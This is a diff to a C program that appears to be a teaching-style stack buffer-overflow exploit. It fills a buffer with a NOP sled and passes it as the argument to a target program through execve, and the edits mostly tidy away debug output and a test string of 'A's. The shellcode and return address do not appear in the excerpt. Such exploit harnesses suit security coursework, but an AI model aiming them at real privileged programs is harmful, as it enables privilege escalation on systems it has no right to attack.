@@ -19,9 +19,6 @@ int main(void)
   char buffer[BUFFER_SIZE]; // Make larger size as target program?
   char *env[1];
   
-  // clear buffer
-  // memset(buffer, 0, BUFFER_SIZE); // 0 bytes will stop strcpy?!?!?
-
   // Initialize buffer with NOP instructions
   memset(buffer, 0x90, BUFFER_SIZE-4);
 
@@ -33,17 +30,14 @@ int main(void)
   printf("Size of addr: %d\n", sizeof(addr));
 
   // Print out buffer for testing
-  for (int i = 0; i < BUFFER_SIZE; i++) {
-    printf("Buffer[%d] = 0x%x\n", i, buffer[i]); 
-  }
+  // for (int i = 0; i < BUFFER_SIZE; i++) {
+  //   printf("Buffer[%d] = 0x%x\n", i, buffer[i]); 
+  // }
 
   args[0] = TARGET; // Must contain filename of file being executed
-  // args[1] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // 399 'A's
   args[1] = buffer;
   args[2] = NULL; // argv and envp arrays must each include a null pointer at end of array
 
-  // printf("args stack target: 0x%x\n", args[1]);
-  
   env[0] = NULL;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
